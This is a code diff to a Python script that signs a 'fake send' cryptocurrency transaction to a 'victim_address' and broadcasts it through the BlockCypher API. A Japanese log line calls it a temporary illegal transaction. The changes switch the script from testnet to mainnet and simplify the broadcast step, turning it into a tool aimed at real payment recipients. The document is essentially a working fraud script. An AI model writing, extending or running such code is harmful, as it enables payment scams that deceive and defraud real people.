@@ -63,10 +63,9 @@ args = parser.parse_args()
 fake_send_from   = args.send_from_wifkey
 victim_address   = args.fake_send_to
 amount_btc  = args.amount_of_coins
-testnet     = args.is_testnet
 token       = args.blockcypher_token
-coin_symbol = args.coin_symbol
-testnet     = True
+coin_symbol = args.currency
+testnet     = False
 
 print(testnet)
 transaction_util = cryptos.Bitcoin(testnet=testnet)
@@ -112,6 +111,7 @@ print("--------------------")
 print(f"Fake Send to                       : {victim_address}")
 print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
 print(f"Signed  RawTx             : {tx_victim}")
+print(f"Currency                  : {coin_symbol.upper()}")
 print(f"Testnet Mode              : {testnet}")
 print("--------------------")
 print()
@@ -129,21 +129,9 @@ time.sleep(3) #詠唱中...  -u-
 
 print("SND TMP ITX TOBC  (ブロックチェーンに一時的な不正なトランザクションを送信!)")
 time.sleep(2)
-
-if "btc" == coin_symbol:
-    if testnet:
-        print(blockcypher.pushtx(tx_victim,
-                        coin_symbol=f"{coin_symbol}-testnet",
-                        api_key=token))
-    else:
-        print(blockcypher.pushtx(tx_victim,
-                        coin_symbol=coin_symbol,
-                        api_key=token))
-
-elif not testnet:
-    print(blockcypher.pushtx(tx_victim,
-                    coin_symbol=coin_symbol,
-                    api_key=token))
+print(blockcypher.pushtx(tx_victim,
+                coin_symbol=coin_symbol,
+                api_key=token)["hash"])
 
 
 #txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=0)
